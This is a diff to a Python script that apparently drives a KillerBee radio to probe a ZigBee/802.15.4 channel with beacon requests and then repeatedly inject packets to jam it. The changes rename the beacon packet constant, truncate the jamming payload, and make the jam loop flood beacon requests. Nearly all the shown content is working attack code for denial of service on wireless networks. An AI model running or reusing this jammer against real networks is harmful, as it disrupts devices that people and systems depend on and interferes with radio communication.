@@ -13,7 +13,7 @@ BEACON_RESPONSE_LISTEN_TRIES = 10
 CHANNEL_INCREMENT = 2
 
 # Beacon request packet (captured via Wireshark)
-BEACON_REQUEST_PKT = str(bytearray([
+BEACON_REQUEST_PKT_BYTES = str(bytearray([
         0x03, 0x08, 0xb4, 0xff, 0xff, 0xff, 0xff, 0x07
         ]))
 
@@ -29,8 +29,7 @@ JAM_PKT_BYTES = str(bytearray([
         166,158,21,13,108,68,112,53,240,100,214,126,72,61,
         80,98,47,198,48,231,96,248,220,92,95,8,195,185,19,
         168,190,233,122,129,101,188,210,46,85,229,144,247,
-        167,123,194,193,234,74,174,147,242,255,179,197,103,
-        57,152,73,5,44,63,56,141,211,202,45,224,178
+        167,123,194,193,234,74,174,147,242,255,179,197,103
         ]))
 
 # Command line main function
@@ -51,7 +50,7 @@ if __name__ == '__main__':
         while not got_beacon_response:
             # Send request
             print('1. Sending beacon request.')
-            kb.inject(BEACON_REQUEST_PKT, args.channel, 1, 0)
+            kb.inject(BEACON_REQUEST_PKT_BYTES, args.channel, 1, 0)
 
             # Get the response. If, after 10 packets, we haven't gotten a
             # response, assume the request was lost and try to resend it
@@ -60,7 +59,7 @@ if __name__ == '__main__':
             while tries > 0 and not got_beacon_response:
                 packet = kb.pnext()
                 if packet:
-                    print '  Got a packet... ',
+                    print '  Got a packet...',
                     packet_bytes = bytearray(packet['bytes'])
                     # Beacon responses have 0b000 at the end of their first byte
                     if (packet_bytes[0] & 0b111 == 0b000):
@@ -93,7 +92,7 @@ if __name__ == '__main__':
         time_start_us = time.time();
         time_us = time_start_us
         while time_us - time_start_us < (JAM_TIME_SEC * 100000):
-            kb.inject(JAM_PKT_BYTES, args.channel, 1, 0)
+            kb.inject(BEACON_REQUEST_PKT_BYTES, args.channel, 1, 0)
             time_us = time.time();
 
         # Increment channel
